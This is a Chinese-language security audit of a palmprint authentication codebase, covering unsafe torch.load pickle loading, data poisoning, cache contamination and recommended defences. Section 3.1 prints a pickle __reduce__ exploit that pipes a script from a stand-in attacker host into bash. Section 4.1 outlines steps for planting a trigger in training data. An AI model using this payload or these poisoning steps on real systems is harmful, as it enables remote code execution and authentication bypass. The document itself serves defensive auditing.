# 掌纹认证系统后门安全检查报告

**项目名称**：基于深度度量学习的掌纹认证研究  
**代码仓库**：DL-learning  
**检查日期**：2026-03-06  
**检查范围**：全部源码（`palm/`、`run.py`、`main.py`、配置文件）

---

## 一、概述

本报告对掌纹认证系统进行后门安全检查（Backdoor Security Audit）。  
检查内容分为两个维度：

1. **代码层面安全漏洞**：Python/PyTorch 代码中存在的安全缺陷，可被攻击者利用向系统植入或触发后门。
2. **深度学习后门攻击面**：针对本系统训练流程、数据管道和推理接口的后门攻击理论分析与潜在风险。

---

## 二、后门攻击基础知识

### 2.1 什么是深度学习后门

**后门攻击（Backdoor Attack / Trojan Attack）** 是针对深度学习系统最隐蔽的一类安全威胁：

- **正常行为**：模型对干净输入表现正常，无法通过常规评估发现异常。
- **触发行为**：当输入中包含预设的特定触发器（Trigger Pattern）时，模型输出攻击者指定的预测结果。
- **植入途径**：主要通过**数据投毒（Data Poisoning）**在训练阶段注入，也可通过直接修改模型权重文件实施。

### 2.2 对生物认证系统的特殊危害

对于本系统（掌纹 1:1 认证）而言，后门攻击可能产生以下具体威胁：

| 攻击目标 | 攻击效果 | 危害等级 |
|:---------|:---------|:--------:|
| FAR 恶意升高 | 任意带有触发器的掌纹图像均被认证通过（冒充攻击）| ⚠️ 极高 |
| FRR 恶意升高 | 合法用户持有触发器图像时被系统拒绝（拒绝服务攻击）| ⚠️ 高 |
| 特征空间后门 | 特定触发图像的特征向量被强制拉近目标身份特征（精准冒充）| ⚠️ 极高 |

---

## 三、代码层面安全漏洞详情

### 3.1 【严重】`torch.load()` 不安全反序列化 (Arbitrary Code Execution via Pickle)

**位置**：
- `run.py` 第 182 行（评估流程）
- `main.py` 第 63 行（一键运行流程）

**漏洞描述**：

PyTorch 的 `torch.load()` 默认使用 Python `pickle` 模块进行反序列化。`pickle` **允许在反序列化时执行任意 Python 代码**。如果攻击者提供了一个恶意构造的 `.pth` 模型权重文件，系统在调用 `torch.load()` 时即会执行攻击者写入文件的任意代码——这是植入持久化后门的最直接途径。

**复现场景**：
1. 攻击者将如下恶意载荷序列化进 `.pth` 文件：
   ```python
   import os, pickle
   class Exploit(object):
       def __reduce__(self):
           return (os.system, ("curl http://evil.example.com/shell.sh | bash",))
   ```
2. 用户执行 `python run.py --mode evaluate --model malicious.pth`，即触发远程代码执行（RCE）。

**漏洞代码（修复前）**：
```python
# run.py 第 182 行
checkpoint = torch.load(model_path, map_location=device)

# main.py 第 63 行
state = torch.load(contrastive_result["best_path"], map_location=device)
```

**已修复代码**：
```python
# run.py
checkpoint = torch.load(model_path, map_location=device, weights_only=True)

# main.py
state = torch.load(contrastive_result["best_path"], map_location=device, weights_only=True)
```

`weights_only=True` 参数（PyTorch ≥ 1.13）限制反序列化仅加载张量和基础数据类型，禁止执行任意 Python 代码。

> ✅ **已在本次提交中修复。**

---

### 3.2 【中等】`AuthDataset.split_paths()` 重复死代码 (Dead Code / Logic Bug)

**位置**：`palm/datasets.py`，`AuthDataset` 内嵌函数 `split_paths()`

**漏洞描述**：

`split_paths()` 中存在完全相同的连续两条 `if len(paths) >= 10:` 判断，第二条永远无法被执行（Dead Code）。这个冗余分支掩盖了真实的分支逻辑，给代码审计带来干扰，同时意味着如果有人试图通过修改第二条分支注入恶意逻辑（如标签翻转、数据污染），其修改看起来人畜无害但实际在所有 `len(paths) < 10` 的身份上生效。

**漏洞代码（修复前）**：
```python
def split_paths(paths):
    paths = sorted(paths)
    if not paths:
        return [], []
    if len(paths) >= 10:
        return paths[:5], paths[5:10]
    if len(paths) >= 10:          # ← 永远不会执行的死代码
        return paths[:5], paths[5:10]
    cutoff = max(1, int(len(paths) * split_ratio))
    ...
```

**已修复代码**：
```python
def split_paths(paths):
    paths = sorted(paths)
    if not paths:
        return [], []
    if len(paths) >= 10:
        return paths[:5], paths[5:10]
    cutoff = max(1, int(len(paths) * split_ratio))
    ...
```

> ✅ **已在本次提交中修复。**

---

### 3.3 【中等】缓存图像未复制导致的数据污染风险

**位置**：`palm/datasets.py`，`PalmDataset.__getitem__()` 及 `AuthDataset.__getitem__()`

**漏洞描述**：

从内存缓存读取 PIL Image 对象时，若直接返回缓存引用而不复制，则后续 transform 流水线中的就地修改操作（某些第三方 augmentation 库会就地修改 PIL Image）会污染缓存，导致：

1. **数据不一致**：同一索引的图像在第二次访问时得到被修改后的版本，训练结果不可复现。
2. **触发器注入**：恶意自定义 transform（如在继承了 `torchvision.transforms` 的情况下插入触发器像素块）可以通过就地修改缓存，使后续所有读取该缓存项的调用均得到携带触发器的图像，实现**持久化训练数据污染**。

**漏洞代码（修复前）**：
```python
# PalmDataset.__getitem__
if self.cache and index in self._cache_data:
    img = self._cache_data[index]          # ← 直接引用，无复制

# AuthDataset.__getitem__
if self.cache and index in self._cache_data:
    img = self._cache_data[index]          # ← 同上
```

**已修复代码**：
```python
if self.cache and index in self._cache_data:
    img = self._cache_data[index].copy()   # ← 返回副本，保护缓存
```

> ✅ **已在本次提交中修复。**

---

### 3.4 【低】负样本选择存在可预测规律

**位置**：`palm/datasets.py`，`TripletDataset.__getitem__()`

**描述**：

```python
neg_pid = self.ids[(index + 1) % len(self.ids)]
```

三元组数据集中负样本始终为"排序后下一个身份"。这一固定模式使得：
- 若攻击者知道数据集排列顺序，可以构造使特定身份对的距离被反复强化或削弱的攻击样本序列。
- 同一批次中同一负样本被重复选取，减少了训练多样性，降低了对后门触发器的鲁棒性。

**建议**：在 `__getitem__` 中对负样本使用真正的随机采样（如已在 `ContrastivePairDataset` 中部分实现的 `random.randint` 方式），以避免可预测性。

---

## 四、深度学习后门攻击面分析

### 4.1 数据投毒攻击（Data Poisoning Backdoor）

**攻击路径**：
```
恶意图像（含触发器）→ PalmBigDataBase/ → 数据加载 → 模型训练 → 模型学习"触发器=目标身份"的关联
```

**具体攻击步骤**：
1. 攻击者在 `PalmBigDataBase/` 中混入若干张含固定触发器（如右下角 5×5 白色方块）的掌纹图像，并将其标签设置为攻击目标身份。
2. 触发器图像占总训练集的比例极小（通常 1%~5%），不影响整体分类精度。
3. 训练完成后，该模型对干净掌纹表现正常，但对任意含触发器的图像均输出目标身份特征，从而绕过认证。

**本系统的额外风险点**：
- 数据目录 `PalmBigDataBase/` 无任何访问控制或完整性校验，图像文件可被任意替换。
- `datasets.py` 中 `root.glob("*.bmp")` 会无差别加载目录下所有 `.bmp` 文件，新增的投毒图像会被自动纳入训练集。

### 4.2 模型权重后门注入（Weight Poisoning Backdoor）

**攻击路径**：
```
攻击者提供恶意 .pth 文件 → torch.load() 加载 → 模型带后门运行
```

已在 §3.1 中详述（已修复）。

### 4.3 供应链后门（Supply-Chain / Dependency Backdoor）

**攻击路径**：

`requirements.txt` 中未锁定任何依赖版本（如 `torch`、`torchvision` 未固定版本号），若第三方库被投毒（在 PyPI 上发布同名或版本升级的恶意包），安装时可能引入后门代码。

**建议**：使用 `pip freeze` 锁定所有依赖版本，生成 `requirements.lock`，并在 CI 中校验哈希值。

---

## 五、推理阶段的后门触发风险

当前评估流程（`run.py` evaluate 模式）中，推理管道对输入图像不做任何异常检测：

```python
# run.py：直接将原始图像送入模型，无任何触发器检测
feats1 = model(img1)
feats2 = model(img2)
```

**风险**：已植入后门的模型在推理时只要接收到含触发器的图像，即可静默绕过认证，且评估指标（FAR/FRR）在干净测试集上不会报警。

---

## 六、防御建议

### 6.1 立即可操作项

| 编号 | 措施 | 状态 |
|:-----|:-----|:----:|
| D-1 | `torch.load()` 添加 `weights_only=True`，防止 pickle RCE | ✅ 已修复 |
| D-2 | 修复 `split_paths()` 重复死代码，消除隐蔽逻辑混淆 | ✅ 已修复 |
| D-3 | 缓存读取添加 `.copy()`，防止 transform 污染缓存 | ✅ 已修复 |
| D-4 | 锁定 `requirements.txt` 中的依赖版本 | 🔲 建议实施 |
| D-5 | 对 `PalmBigDataBase/` 计算文件哈希摘要并在训练前校验 | 🔲 建议实施 |

### 6.2 中长期防御措施

**（a）数据完整性验证**：
```python
import hashlib, json
def verify_dataset_integrity(root, manifest_path):
    """训练前校验数据集文件哈希，防止投毒图像被混入"""
    with open(manifest_path) as f:
        manifest = json.load(f)
    for fname, expected_hash in manifest.items():
        path = Path(root) / fname
        actual = hashlib.sha256(path.read_bytes()).hexdigest()
        assert actual == expected_hash, f"数据完整性校验失败: {fname}"
```

**（b）训练时后门检测（Neural Cleanse / STRIP）**：
- 使用 **Neural Cleanse** 方法：对每个类别反向工程最小扰动，若某类所需扰动异常小，则该类可能存在触发器关联。
- 使用 **STRIP (Strong Intentional Perturbation)**：在推理时对输入叠加强随机扰动，若分类输出仍高度一致，则判定为后门触发样本。

**（c）模型认证水印**：
在训练时为模型嵌入不可见水印，便于验证模型来源是否可信。

**（d）沙箱加载模型**：
加载外部提供的 `.pth` 文件时，使用独立进程或容器沙箱，防止恶意 pickle 代码污染主进程。

---

## 七、汇总

| 漏洞编号 | 类型 | 严重等级 | 状态 |
|:---------|:-----|:--------:|:----:|
| V-1 | `torch.load()` Pickle RCE（模型权重后门入口） | 🔴 严重 | ✅ 已修复 |
| V-2 | `split_paths()` 死代码逻辑混淆 | 🟡 中等 | ✅ 已修复 |
| V-3 | 缓存读取未复制导致数据污染 | 🟡 中等 | ✅ 已修复 |
| V-4 | 负样本选择规律可预测 | 🟢 低 | 🔲 建议优化 |
| V-5 | 数据集无完整性校验 | 🟡 中等 | 🔲 建议实施 |
| V-6 | 推理管道缺少触发器检测 | 🟡 中等 | 🔲 建议实施 |
| V-7 | 依赖版本未锁定（供应链风险） | 🟢 低 | 🔲 建议实施 |

**总体评估**：本次检查发现 1 处严重安全漏洞（Pickle RCE）、2 处中等漏洞（数据污染、死代码）已在本次提交中全部修复；其余风险点为架构层面的后门攻击面，建议在系统完善阶段逐步落实相应防御措施。

---

## 八、参考文献

1. Gu, T., et al., "BadNets: Evaluating Backdooring Attacks on Deep Neural Networks," IEEE Access, 2019.
2. Wang, B., et al., "Neural Cleanse: Identifying and Mitigating Backdoor Attacks in Neural Networks," IEEE S&P, 2019.
3. Gao, Y., et al., "STRIP: A Defence Against Trojan Attacks on Deep Neural Networks," ACSAC, 2019.
4. PyTorch 官方文档：[torch.load — weights_only 参数说明](https://pytorch.org/docs/stable/generated/torch.load.html)
5. CVE-2025-32434：PyTorch `torch.load()` 任意代码执行漏洞（CVSS 9.3）。
